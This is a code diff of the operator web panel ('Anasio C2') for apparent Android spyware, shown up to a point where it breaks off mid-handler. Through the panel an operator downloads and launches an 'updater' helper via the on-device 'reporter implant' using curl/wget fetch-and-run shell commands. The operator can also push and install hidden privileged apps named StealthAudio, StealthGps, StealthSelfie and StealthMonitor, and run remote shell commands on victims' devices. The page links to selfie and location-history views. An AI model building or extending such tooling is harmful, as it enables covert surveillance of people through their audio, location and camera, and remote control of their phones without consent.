@@ -4,305 +4,382 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Updater Manager — Anasio C2</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', sans-serif; background: #f3f4f6; color: #111827; margin: 0; }
-        .container { max-width: 1100px; margin: 0 auto; padding: 24px; }
-        .card { background: #fff; border: 1px solid #e5e7eb; border-radius: 24px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.06); padding: 28px; margin-bottom: 24px; }
-        .badge { display: inline-flex; align-items: center; justify-content: center; background: #eef2ff; color: #4338ca; font-weight: 700; padding: 8px 12px; border-radius: 9999px; font-size: 0.75rem; letter-spacing: 0.05em; }
-        .field { display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; }
-        label { font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; }
-        input, select, textarea { width: 100%; border: 1px solid #d1d5db; border-radius: 16px; padding: 14px 16px; font-size: 0.95rem; color: #111827; background: #f9fafb; }
-        textarea { min-height: 150px; resize: vertical; }
-        button { font-weight: 700; border-radius: 16px; padding: 14px 20px; border: none; cursor: pointer; transition: transform 120ms ease, background-color 120ms ease; }
-        button:hover { transform: translateY(-1px); }
-        .btn-primary { background: #4338ca; color: #fff; }
-        .btn-secondary { background: #e5e7eb; color: #111827; }
-        .grid { display: grid; gap: 18px; }
-        .grid-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-        pre { background: #111827; color: #f9fafb; padding: 18px; border-radius: 18px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9rem; }
-        .nav { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 24px; }
-        .nav a { font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #4b5563; text-decoration: none; }
-        .nav a:hover { color: #1f2937; }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
 </head>
-<body>
-    <div class="container">
-        <div class="nav">
-            <a href="/">Dashboard</a>
-            <a href="/apps_view">App Blocker</a>
-            <a href="/selfies_view">Selfies</a>
-            <a href="/errors_view">Diagnostics</a>
-            <a href="/history_view">Location History</a>
-            <a href="/updater_view">Updater</a>
-        </div>
+<body class="bg-gray-100 text-gray-900 min-h-screen p-4 md:p-8">
+    <div id="toast-container" class="fixed top-4 right-4 z-[9999] flex flex-col gap-2 pointer-events-none"></div>
 
-        <div class="card">
-            <div style="display:flex; align-items:center; justify-content:space-between; gap:14px; flex-wrap:wrap; margin-bottom:18px;">
+    <div class="max-w-5xl mx-auto">
+        <nav class="mb-8 flex flex-wrap justify-between items-center bg-white px-5 py-4 rounded-2xl border border-gray-200 gap-4">
+            <div class="flex items-center gap-3">
+                <div class="bg-indigo-50 text-indigo-600 p-2.5 rounded-xl"><i class="ti ti-refresh text-xl"></i></div>
                 <div>
-                    <p style="font-size:0.75rem; color:#6b7280; letter-spacing:0.12em; text-transform:uppercase; margin:0 0 8px 0;">Updater Manager</p>
-                    <h1 style="font-size:1.8rem; margin:0;">Download & launch updater helper</h1>
-                </div>
-                <span class="badge">Same server / different process</span>
-            </div>
-            <div class="grid">
-                <div class="field">
-                    <label for="reporter-device">Reporter device ID</label>
-                    <select id="reporter-device"></select>
-                </div>
-                <div class="field">
-                    <label for="updater-device-id">Updater helper device ID</label>
-                    <input id="updater-device-id" type="text" placeholder="updater_TARGETID" />
-                </div>
-                <div class="field">
-                    <label for="updater-url">Hosted updater binary URL</label>
-                    <input id="updater-url" type="text" value="https://raw.githubusercontent.com/gerach07/android-telemetry-server/main/web/static/updater.bin" />
-                </div>
-                <div class="field">
-                    <label for="reporter-path">Reporter binary path on device</label>
-                    <input id="reporter-path" type="text" value="/data/local/tmp/reporter" />
-                </div>
-                <div class="field">
-                    <label for="updater-save-path">Updater save path</label>
-                    <input id="updater-save-path" type="text" value="/data/local/tmp/updater.bin" />
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">System Management</p>
+                    <h1 class="text-xl font-semibold text-gray-900">Updater Manager</h1>
                 </div>
             </div>
-            <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:12px;">
-                <button id="download-launch-btn" class="btn-primary">Download & Launch Helper</button>
-                <button id="download-only-btn" class="btn-secondary">Download Only</button>
-                <button id="check-updater-btn" class="btn-secondary">Check Helper File</button>
-                <button id="refresh-btn" class="btn-secondary">Refresh Devices</button>
+            <div class="flex flex-wrap items-center gap-1.5">
+                <a href="/" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-3 py-1.5 rounded-lg transition"><i class="ti ti-cpu text-sm"></i> C2</a>
+                <a href="/apps_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-3 py-1.5 rounded-lg transition"><i class="ti ti-apps text-sm"></i> Apps</a>
+                <a href="/selfies_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-3 py-1.5 rounded-lg transition"><i class="ti ti-camera text-sm"></i> Selfies</a>
+                <a href="/errors_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-3 py-1.5 rounded-lg transition"><i class="ti ti-alert-circle text-sm"></i> Diag</a>
+                <a href="/history_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-3 py-1.5 rounded-lg transition"><i class="ti ti-history text-sm"></i> History</a>
             </div>
-            <p style="margin-top:16px; color:#4b5563; font-size:0.95rem;">This helper will be downloaded by the current reporter implant and started as a separate updater process. Use Download Only to stage the updater binary first, then Check Helper File to confirm it landed before launching it.</p>
+        </nav>
+
+        <!-- Status -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-6 mb-6">
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-semibold flex items-center gap-2"><i class="ti ti-activity text-emerald-500"></i> Updater Status</h2>
+                <button id="refresh-status-btn" class="text-xs font-semibold px-3 py-1.5 rounded-lg bg-gray-100 hover:bg-gray-200">Refresh</button>
+            </div>
+            <div id="updater-status-list" class="space-y-2 text-sm text-gray-600">Loading...</div>
+            <div class="mt-4">
+                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Recent updater log</p>
+                <pre id="updater-log" class="bg-gray-900 text-gray-100 text-xs p-4 rounded-xl overflow-x-auto max-h-40">No activity.</pre>
+            </div>
         </div>
 
-        <div class="card">
-            <h2 style="font-size:1.3rem; margin:0 0 14px 0;">Send task to updater</h2>
-            <div class="grid grid-2">
-                <div class="field">
-                    <label for="updater-connection">Updater connection ID</label>
-                    <select id="updater-connection"></select>
+        <!-- Upload packages to server -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-6 mb-6">
+            <h2 class="text-lg font-semibold mb-2 flex items-center gap-2"><i class="ti ti-upload text-indigo-500"></i> Upload OTA packages (server staging)</h2>
+            <p class="text-xs text-gray-500 mb-4">Upload a full priv-app folder as <strong>.zip</strong> (e.g. <code class="bg-gray-100 px-1 rounded">com.stealthaudio/com.stealthaudio.apk</code> + extras), a single <strong>.apk</strong>, or the <strong>reporter</strong> binary. Packages install to <code class="bg-gray-100 px-1 rounded">/system/priv-app/&lt;package&gt;/</code> on device.</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Component</label>
+                    <select id="upload-component" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50">
+                        <option value="reporter">reporter (binary)</option>
+                        <option value="StealthAlert">StealthAlert</option>
+                        <option value="StealthAudio">StealthAudio</option>
+                        <option value="StealthGps">StealthGps</option>
+                        <option value="StealthMonitor">StealthMonitor</option>
+                        <option value="StealthSelfie">StealthSelfie</option>
+                    </select>
                 </div>
-                <div class="field">
-                    <label for="updater-task">Updater task</label>
-                    <select id="updater-task">
-                        <option value="download_reporter">download_reporter</option>
-                        <option value="replace_reporter">replace_reporter</option>
-                        <option value="stop_reporter">stop_reporter</option>
-                        <option value="start_reporter">start_reporter</option>
-                        <option value="shell">shell</option>
-                        <option value="status">status</option>
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">File (.zip, .apk, or binary)</label>
+                    <input id="upload-file" type="file" accept=".zip,.apk,*" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50 text-sm" />
+                </div>
+            </div>
+            <div class="flex flex-wrap gap-2 mb-4">
+                <button id="upload-btn" class="bg-indigo-600 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-indigo-700">Upload to server</button>
+                <button id="delete-package-btn" class="bg-gray-200 text-gray-800 text-sm font-semibold px-4 py-2 rounded-xl hover:bg-gray-300">Delete staged package</button>
+            </div>
+            <div>
+                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Staged on server</p>
+                <div id="staged-packages" class="text-sm text-gray-600 space-y-1">Loading...</div>
+            </div>
+        </div>
+
+        <!-- Launch -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-6 mb-6">
+            <h2 class="text-lg font-semibold mb-4 flex items-center gap-2"><i class="ti ti-rocket text-indigo-500"></i> Launch Updater on Device</h2>
+            <p class="text-xs text-gray-500 mb-4">Push <code class="bg-gray-100 px-1 rounded">updater.bin</code> to the device first, then launch via reporter shell.</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Target Reporter</label>
+                    <select id="reporter-device" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50"></select>
+                </div>
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Updater device_id</label>
+                    <input id="updater-device-id" type="text" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50" placeholder="updater_SERIAL" />
+                </div>
+            </div>
+            <div class="mb-4">
+                <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Binary path on device</label>
+                <input id="updater-path" type="text" value="/data/local/tmp/updater.bin" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50" />
+            </div>
+            <button id="launch-btn" class="bg-indigo-600 text-white font-semibold px-6 py-3 rounded-xl hover:bg-indigo-700 transition">Launch updater via reporter shell</button>
+        </div>
+
+        <!-- Push + install -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-6 mb-6">
+            <h2 class="text-lg font-semibold mb-2 flex items-center gap-2"><i class="ti ti-package text-indigo-500"></i> Push &amp; install OTA</h2>
+            <p class="text-xs text-gray-500 mb-4">1) Upload packages above → 2) <strong>Push to device</strong> (curl into <code class="bg-gray-100 px-1 rounded">/data/local/tmp/ota/</code>) → 3) <strong>Install</strong> via updater (full app dirs + reporter).</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Active updater connection</label>
+                    <select id="updater-connection" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50"></select>
+                </div>
+                <div>
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Component (single install)</label>
+                    <select id="apk-component" class="mt-1 w-full border rounded-xl px-3 py-2 bg-gray-50">
+                        <option value="all">All staged on device</option>
+                        <option value="reporter">reporter</option>
+                        <option value="StealthAlert">StealthAlert</option>
+                        <option value="StealthAudio">StealthAudio</option>
+                        <option value="StealthGps">StealthGps</option>
+                        <option value="StealthMonitor">StealthMonitor</option>
+                        <option value="StealthSelfie">StealthSelfie</option>
                     </select>
                 </div>
             </div>
-            <div class="field">
-                <label for="task-payload">Task payload (JSON)</label>
-                <textarea id="task-payload">{"url":"https://raw.githubusercontent.com/gerach07/android-telemetry-server/main/web/static/updater.bin","destination":"/data/local/tmp/reporter","command":"echo hello"}</textarea>
+            <div class="flex flex-wrap gap-2">
+                <button id="push-staging-btn" class="bg-cyan-600 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-cyan-700">Push staged → device</button>
+                <button id="install-staging-btn" class="bg-indigo-600 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-indigo-700">Install on device (updater)</button>
+                <button id="update-reporter-btn" class="bg-gray-900 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-black">Install reporter only</button>
+                <button id="update-apk-btn" class="bg-gray-900 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-black">Install selected app dir</button>
+                <button id="update-all-btn" class="bg-gray-800 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-black">Install all staged on device</button>
+                <button id="kill-updater-btn" class="bg-red-600 text-white text-sm font-semibold px-4 py-2 rounded-xl hover:bg-red-700">Kill updater</button>
             </div>
-            <div style="display:flex; gap:12px; flex-wrap:wrap;">
-                <button id="send-task-btn" class="btn-primary">Send task to updater</button>
-            </div>
-            <p style="margin-top:16px; color:#4b5563;">Use this to control the updater helper once it has connected. The helper forwards status and error responses back into the existing C2 server pipeline.</p>
         </div>
 
-        <div class="card">
-            <h2 style="font-size:1.3rem; margin:0 0 14px 0;">Latest command feedback</h2>
-            <pre id="task-response">No response yet.</pre>
+        <!-- Shell -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-6 mb-6">
+            <h2 class="text-lg font-semibold mb-4 flex items-center gap-2"><i class="ti ti-terminal text-indigo-500"></i> Updater shell</h2>
+            <input id="shell-cmd" type="text" placeholder="ls -la /data/local/tmp/ota" class="w-full border rounded-xl px-3 py-2 bg-gray-50 mb-3" />
+            <button id="shell-btn" class="bg-gray-900 text-white font-semibold px-6 py-2 rounded-xl hover:bg-black">Run on updater</button>
+        </div>
+
+        <div class="bg-white rounded-2xl border border-gray-200 p-6">
+            <h2 class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">Latest response</h2>
+            <pre id="task-response" class="bg-gray-900 text-gray-100 text-xs p-4 rounded-xl overflow-x-auto">No activity.</pre>
         </div>
     </div>
 
     <script>
-        const reporterSelect = document.getElementById('reporter-device');
-        const updaterConnectionSelect = document.getElementById('updater-connection');
-        const updaterDeviceIdInput = document.getElementById('updater-device-id');
-        const updaterUrlInput = document.getElementById('updater-url');
-        const reporterPathInput = document.getElementById('reporter-path');
-        const updaterSavePathInput = document.getElementById('updater-save-path');
-        const downloadLaunchBtn = document.getElementById('download-launch-btn');
-        const downloadOnlyBtn = document.getElementById('download-only-btn');
-        const checkUpdaterBtn = document.getElementById('check-updater-btn');
-        const refreshBtn = document.getElementById('refresh-btn');
-        const sendTaskBtn = document.getElementById('send-task-btn');
-        const taskPayloadInput = document.getElementById('task-payload');
-        const taskResponse = document.getElementById('task-response');
+        function showToast(msg, type = 'info', ms = 4000) {
+            const container = document.getElementById('toast-container');
+            const colors = { success: '#059669', warning: '#d97706', error: '#dc2626', info: '#6366f1' };
+            const toast = document.createElement('div');
+            toast.style.cssText = `background:${colors[type]||colors.info};color:#fff;padding:11px 18px;border-radius:10px;font-size:12px;font-weight:600;box-shadow:0 4px 20px rgba(0,0,0,.25);opacity:0;transform:translateX(40px);transition:all .25s ease;max-width:360px;pointer-events:auto;`;
+            toast.textContent = msg;
+            container.appendChild(toast);
+            requestAnimationFrame(() => { toast.style.opacity='1'; toast.style.transform='translateX(0)'; });
+            setTimeout(() => {
+                toast.style.opacity='0'; toast.style.transform='translateX(40px)';
+                setTimeout(() => toast.remove(), 300);
+            }, ms);
+        }
 
-        async function fetchReporterDevices() {
+        function wsUrlFromPage() {
+            const origin = window.location.origin;
+            if (origin.startsWith('https://')) return origin.replace(/^https/, 'wss') + '/ws';
+            return origin.replace(/^http/, 'ws') + '/ws';
+        }
+
+        function formatBytes(n) {
+            if (n < 1024) return n + ' B';
+            if (n < 1048576) return (n/1024).toFixed(1) + ' KB';
+            return (n/1048576).toFixed(1) + ' MB';
+        }
+
+        async function refreshStagedPackages() {
             try {
-                const res = await fetch('/devices');
-                if (!res.ok) return;
+                const res = await fetch('/updater/packages');
                 const data = await res.json();
-                reporterSelect.innerHTML = '';
-                if (Array.isArray(data.devices) && data.devices.length) {
-                    data.devices.forEach(did => {
-                        const opt = document.createElement('option');
-                        opt.value = did;
-                        opt.textContent = did;
-                        reporterSelect.appendChild(opt);
-                    });
-                } else {
-                    const opt = document.createElement('option');
-                    opt.value = '';
-                    opt.textContent = 'No reporters connected';
-                    reporterSelect.appendChild(opt);
+                const el = document.getElementById('staged-packages');
+                const pkgs = data.packages || [];
+                if (!pkgs.length) {
+                    el.innerHTML = '<p class="text-gray-400">No packages staged on server yet.</p>';
+                    return;
                 }
-                if (!updaterDeviceIdInput.value && data.devices.length) {
-                    updaterDeviceIdInput.value = 'updater_' + data.devices[0];
-                }
-            } catch (err) {
-                console.error(err);
+                el.innerHTML = pkgs.map(p => `
+                    <div class="flex justify-between items-center p-2 rounded-lg border border-gray-100 bg-gray-50">
+                        <span><strong>${p.component}</strong> <span class="text-gray-400 font-mono text-xs">${p.package}</span></span>
+                        <span class="text-xs text-gray-500">${p.files.length} file(s) · ${formatBytes(p.size_bytes)}</span>
+                    </div>
+                `).join('');
+            } catch (e) {
+                console.error(e);
             }
         }
 
-        async function fetchActiveConnections() {
+        async function refreshData() {
             try {
-                const res = await fetch('/active_connections');
-                if (!res.ok) return;
-                const data = await res.json();
-                updaterConnectionSelect.innerHTML = '';
-                if (Array.isArray(data.connections) && data.connections.length) {
-                    data.connections.forEach(id => {
-                        const opt = document.createElement('option');
-                        opt.value = id;
-                        opt.textContent = id;
-                        updaterConnectionSelect.appendChild(opt);
-                    });
+                const [devRes, statusRes] = await Promise.all([
+                    fetch('/devices'),
+                    fetch('/updater_status')
+                ]);
+                const devData = await devRes.json();
+                const statusData = await statusRes.json();
+
+                const reporters = (devData.devices || []).filter(d => !d.startsWith('updater_'));
+                const reporterSel = document.getElementById('reporter-device');
+                const prevRep = reporterSel.value;
+                reporterSel.innerHTML = reporters.map(d => `<option value="${d}">${d}</option>`).join('') || '<option value="">No reporters</option>';
+                if (reporters.includes(prevRep)) reporterSel.value = prevRep;
+
+                const connSel = document.getElementById('updater-connection');
+                const prevConn = connSel.value;
+                const live = (statusData.updaters || []).filter(u => u.is_online);
+                connSel.innerHTML = live.length
+                    ? live.map(u => `<option value="${u.device_id}">${u.device_id} (online)</option>`).join('')
+                    : '<option value="">No updater online</option>';
+                if (live.some(u => u.device_id === prevConn)) connSel.value = prevConn;
+
+                const statusEl = document.getElementById('updater-status-list');
+                if (!statusData.updaters || statusData.updaters.length === 0) {
+                    statusEl.innerHTML = '<p class="text-gray-400">No updater has connected yet.</p>';
                 } else {
-                    const opt = document.createElement('option');
-                    opt.value = '';
-                    opt.textContent = 'No active updater connection';
-                    updaterConnectionSelect.appendChild(opt);
+                    statusEl.innerHTML = statusData.updaters.map(u => `
+                        <div class="flex items-center justify-between p-3 rounded-xl border ${u.is_online ? 'border-emerald-200 bg-emerald-50' : 'border-gray-200 bg-gray-50'}">
+                            <span class="font-mono text-sm">${u.device_id}</span>
+                            <span class="text-xs font-bold ${u.is_online ? 'text-emerald-600' : 'text-gray-400'}">${u.is_online ? '● ONLINE' : 'offline — last ' + u.last_seen}</span>
+                        </div>
+                    `).join('');
                 }
+
+                const logs = (statusData.recent_logs || []).map(l => `[${l.timestamp}] ${l.message}`).join('\n');
+                document.getElementById('updater-log').textContent = logs || 'No updater log entries.';
+                await refreshStagedPackages();
             } catch (err) {
-                console.error(err);
+                console.error('Refresh failed', err);
+                showToast('Failed to refresh updater status', 'error');
             }
         }
 
-        function buildLaunchCommand() {
-            const url = updaterUrlInput.value.trim();
-            const savePath = updaterSavePathInput.value.trim();
-            const reporterPath = reporterPathInput.value.trim();
-            const updaterId = updaterDeviceIdInput.value.trim();
-            if (!url || !savePath || !reporterPath || !updaterId) {
-                throw new Error('Fill all required updater fields.');
-            }
-
-            const escapedUrl = url.replace(/"/g, '\\"');
-            const escapedSave = savePath.replace(/"/g, '\\"');
-            const escapedReporter = reporterPath.replace(/"/g, '\\"');
-            const serverUrl = window.location.origin.replace(/^http:/, 'https:') + '/ws';
-
-            const downloadCmd = `if command -v curl >/dev/null 2>&1; then curl -fsSL \"${escapedUrl}\" -o \"${escapedSave}\"; elif command -v wget >/dev/null 2>&1; then wget -qO \"${escapedSave}\" \"${escapedUrl}\"; elif command -v busybox >/dev/null 2>&1; then busybox wget -qO \"${escapedSave}\" \"${escapedUrl}\"; else exit 1; fi`;
-            const launchCmd = `chmod +x \"${escapedSave}\" && sh -c \"\\\"${escapedSave}\\\" --server-url ${serverUrl} --device-id ${updaterId} --reporter-path \\\"${escapedReporter}\\\" >/data/local/tmp/updater.log 2>&1 &\"`;
-            return `${downloadCmd} && ${launchCmd}`;
-        }
-
-        async function fetchShellOutput(deviceId) {
-            const url = `/shell_output?device_id=${encodeURIComponent(deviceId)}`;
-            const res = await fetch(url);
-            if (!res.ok) {
-                taskResponse.textContent = 'Unable to fetch shell output yet.';
-                return;
-            }
-            const data = await res.json();
-            if (data.output) {
-                taskResponse.textContent = data.output;
-            } else if (data.error) {
-                taskResponse.textContent = `Error: ${data.error}`;
-            } else {
-                taskResponse.textContent = 'No shell output available.';
-            }
-        }
-
-        async function sendReporterShell(deviceId, command, summary) {
-            if (!deviceId) {
-                alert('Select a reporter device first.');
+        async function sendUpdaterTask(task, extra = {}) {
+            const connId = document.getElementById('updater-connection').value;
+            if (!connId) {
+                showToast('No updater connection — launch updater first', 'warning');
+                document.getElementById('task-response').textContent = 'No updater connection selected.';
                 return;
             }
             const fd = new FormData();
-            fd.append('device_id', deviceId);
-            fd.append('command', command);
-            const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
-            if (res.ok) {
-                taskResponse.textContent = `${summary} command sent. Waiting for shell output...`;
-                setTimeout(() => fetchShellOutput(deviceId), 1500);
-            } else {
-                const data = await res.json().catch(() => null);
-                taskResponse.textContent = data ? JSON.stringify(data, null, 2) : 'Failed to send shell command.';
-            }
-        }
-
-        function buildDownloadOnlyCommand() {
-            const url = updaterUrlInput.value.trim();
-            const savePath = updaterSavePathInput.value.trim();
-            if (!url || !savePath) {
-                throw new Error('Fill updater URL and save path.');
-            }
-            const escapedUrl = url.replace(/"/g, '\\"');
-            const escapedSave = savePath.replace(/"/g, '\\"');
-            return `if command -v curl >/dev/null 2>&1; then curl -fsSL "${escapedUrl}" -o "${escapedSave}"; elif command -v wget >/dev/null 2>&1; then wget -qO "${escapedSave}" "${escapedUrl}"; elif command -v busybox >/dev/null 2>&1; then busybox wget -qO "${escapedSave}" "${escapedUrl}"; else echo DOWNLOAD_FAILED; exit 1; fi && chmod +x "${escapedSave}" && echo DOWNLOAD_OK`;
-        }
-
-        function buildCheckCommand() {
-            const savePath = updaterSavePathInput.value.trim();
-            if (!savePath) {
-                throw new Error('Fill updater save path.');
-            }
-            const escapedSave = savePath.replace(/"/g, '\\"');
-            return `if [ -f "${escapedSave}" ]; then ls -l "${escapedSave}"; else echo MISSING; fi`;
-        }
-
-        downloadLaunchBtn.addEventListener('click', async () => {
-            try {
-                const cmd = buildLaunchCommand();
-                await sendReporterShell(reporterSelect.value, cmd, 'Updater launch');
-            } catch (err) {
-                taskResponse.textContent = err.message;
-            }
-        });
-
-        downloadOnlyBtn.addEventListener('click', async () => {
-            try {
-                const cmd = buildDownloadOnlyCommand();
-                await sendReporterShell(reporterSelect.value, cmd, 'Download-only');
-            } catch (err) {
-                taskResponse.textContent = err.message;
-            }
-        });
-
-        checkUpdaterBtn.addEventListener('click', async () => {
-            try {
-                const cmd = buildCheckCommand();
-                await sendReporterShell(reporterSelect.value, cmd, 'Check updater file');
-            } catch (err) {
-                taskResponse.textContent = err.message;
-            }
-        });
-
-        refreshBtn.addEventListener('click', async () => {
-            await fetchReporterDevices();
-            await fetchActiveConnections();
-        });
-
-        sendTaskBtn.addEventListener('click', async () => {
-            if (!updaterConnectionSelect.value) {
-                alert('Select an active updater connection first.');
-                return;
-            }
-            const task = document.getElementById('updater-task').value;
-            const payload = taskPayloadInput.value.trim() || '{}';
-            const fd = new FormData();
-            fd.append('device_id', updaterConnectionSelect.value);
+            fd.append('device_id', connId);
             fd.append('task', task);
-            fd.append('payload', payload);
+            fd.append('payload', JSON.stringify(extra));
             const res = await fetch('/send_task', { method: 'POST', body: fd });
             const data = await res.json();
-            taskResponse.textContent = JSON.stringify(data, null, 2);
+            document.getElementById('task-response').textContent = JSON.stringify(data, null, 2);
+            if (res.ok) showToast('Task sent: ' + task, 'success');
+            else showToast('Failed to send task', 'error');
+            setTimeout(refreshData, 2000);
+        }
+
+        document.getElementById('refresh-status-btn').addEventListener('click', () => {
+            refreshData();
+            showToast('Status refreshed', 'info', 2000);
         });
 
-        window.addEventListener('load', async () => {
-            await fetchReporterDevices();
-            await fetchActiveConnections();
+        document.getElementById('reporter-device').addEventListener('change', (e) => {
+            document.getElementById('updater-device-id').value = 'updater_' + e.target.value;
         });
+
+        document.getElementById('upload-btn').addEventListener('click', async () => {
+            const comp = document.getElementById('upload-component').value;
+            const fileInput = document.getElementById('upload-file');
+            if (!fileInput.files || !fileInput.files[0]) {
+                showToast('Select a file to upload', 'warning');
+                return;
+            }
+            const fd = new FormData();
+            fd.append('component', comp);
+            fd.append('file', fileInput.files[0]);
+            showToast('Uploading ' + comp + '…', 'info', 2000);
+            const res = await fetch('/updater/upload_package', { method: 'POST', body: fd });
+            const data = await res.json();
+            document.getElementById('task-response').textContent = JSON.stringify(data, null, 2);
+            if (res.ok) {
+                showToast(data.message || 'Upload complete', 'success');
+                fileInput.value = '';
+                refreshStagedPackages();
+            } else {
+                showToast(data.message || 'Upload failed', 'error');
+            }
+        });
+
+        document.getElementById('delete-package-btn').addEventListener('click', async () => {
+            const comp = document.getElementById('upload-component').value;
+            const fd = new FormData();
+            fd.append('component', comp);
+            const res = await fetch('/updater/delete_package', { method: 'POST', body: fd });
+            const data = await res.json();
+            if (res.ok) {
+                showToast('Removed staged ' + comp, 'success');
+                refreshStagedPackages();
+            } else showToast('Delete failed', 'error');
+        });
+
+        document.getElementById('launch-btn').addEventListener('click', async () => {
+            const reporterId = document.getElementById('reporter-device').value;
+            if (!reporterId) { showToast('Select a reporter device', 'warning'); return; }
+            const path = document.getElementById('updater-path').value;
+            let updaterId = document.getElementById('updater-device-id').value.trim();
+            if (!updaterId) updaterId = 'updater_' + reporterId;
+            const serverUrl = wsUrlFromPage();
+            const cmd = `chmod 755 "${path}" && nohup "${path}" --server-url ${serverUrl} --device-id ${updaterId} >>/data/local/tmp/updater.log 2>&1 &`;
+            const fd = new FormData();
+            fd.append('device_id', reporterId);
+            fd.append('command', cmd);
+            showToast('Launch command sent…', 'info');
+            const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
+            document.getElementById('task-response').textContent = res.ok
+                ? `Launch sent. Updater should connect as ${updaterId} within ~30s.\nCommand: ${cmd}`
+                : 'Failed to send launch command.';
+            if (res.ok) showToast('Updater launch sent — wait for WS connection', 'success', 5000);
+            else showToast('Launch failed', 'error');
+            setTimeout(refreshData, 5000);
+        });
+
+        document.getElementById('push-staging-btn').addEventListener('click', async () => {
+            const reporterId = document.getElementById('reporter-device').value;
+            if (!reporterId) { showToast('Select a reporter device', 'warning'); return; }
+            const comp = document.getElementById('apk-component').value;
+            const fd = new FormData();
+            fd.append('reporter_device_id', reporterId);
+            fd.append('components', comp === 'all' ? 'all' : comp);
+            showToast('Pushing staged packages to device…', 'info');
+            const res = await fetch('/updater/push_staging', { method: 'POST', body: fd });
+            const data = await res.json();
+            document.getElementById('task-response').textContent = JSON.stringify(data, null, 2);
+            if (res.ok) showToast(data.message || 'Push sent', 'success', 5000);
+            else showToast(data.message || 'Push failed', 'error');
+        });
+
+        document.getElementById('install-staging-btn').addEventListener('click', async () => {
+            const connId = document.getElementById('updater-connection').value;
+            if (!connId) { showToast('Updater not online', 'warning'); return; }
+            const comp = document.getElementById('apk-component').value;
+            const fd = new FormData();
+            fd.append('updater_device_id', connId);
+            fd.append('component', comp);
+            showToast('Install command sent…', 'info');
+            const res = await fetch('/updater/install_staging', { method: 'POST', body: fd });
+            const data = await res.json();
+            document.getElementById('task-response').textContent = JSON.stringify(data, null, 2);
+            if (res.ok) showToast('Install task sent via updater', 'success');
+            else showToast(data.message || 'Install failed', 'error');
+            setTimeout(refreshData, 3000);
+        });
+
+        document.getElementById('update-reporter-btn').addEventListener('click', () => {
+            sendUpdaterTask('updater_update_reporter', { source: '/data/local/tmp/ota/_reporter/reporter' });
+            showToast('Reporter install queued', 'info');
+        });
+        document.getElementById('update-apk-btn').addEventListener('click', () => {
+            const comp = document.getElementById('apk-component').value;
+            if (comp === 'all' || comp === 'reporter') {
+                showToast('Select a single app component', 'warning');
+                return;
+            }
+            sendUpdaterTask('updater_update_app_dir', { component: comp });
+        });
+        document.getElementById('update-all-btn').addEventListener('click', () => sendUpdaterTask('updater_update_all'));
+
+        document.getElementById('kill-updater-btn').addEventListener('click', async () => {
+            const connId = document.getElementById('updater-connection').value;
+            if (!connId) { showToast('No updater online', 'warning'); return; }
+            const fd = new FormData();
+            fd.append('device_id', connId);
+            const res = await fetch('/updater_kill', { method: 'POST', body: fd });
+            const data = await res.json();
+            document.getElementById('task-response').textContent = JSON.stringify(data, null, 2);
+            if (res.ok) showToast('Kill command sent', 'warning');
+            else showToast('Kill failed', 'error');
+            setTimeout(refreshData, 1500);
+        });
+
+        document.getElementById('shell-btn').addEventListener('click', () => {
